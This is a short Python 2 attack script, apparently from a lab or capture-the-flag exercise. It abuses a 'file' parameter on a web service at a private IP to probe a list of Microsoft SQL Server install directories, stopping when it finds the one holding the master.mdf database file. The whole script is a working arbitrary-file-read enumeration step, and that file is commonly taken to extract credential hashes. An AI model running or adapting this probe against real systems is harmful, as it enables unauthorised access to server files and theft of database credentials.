import requests

paths = [
    'C:\Program Files\Microsoft SQL Server\MSSQL.1',
    'C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS',
    'C:\Program Files\Microsoft SQL Server\MSSQL11.SQLEXPRESS',
    'C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS',
    'C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS',
    'C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS'
]

for path in paths:
    print '[-] Checking {path}'.format(path=path)

    mdf_path = '{base}\MSSQL\Template Data\master.mdf'.format(base=path)
    res = requests.get('http://10.2.0.130:8080/', params={ 'file': mdf_path })
    if res.status_code != 500:
        print '[+] Found valid path: {path}'.format(path=path)
        break
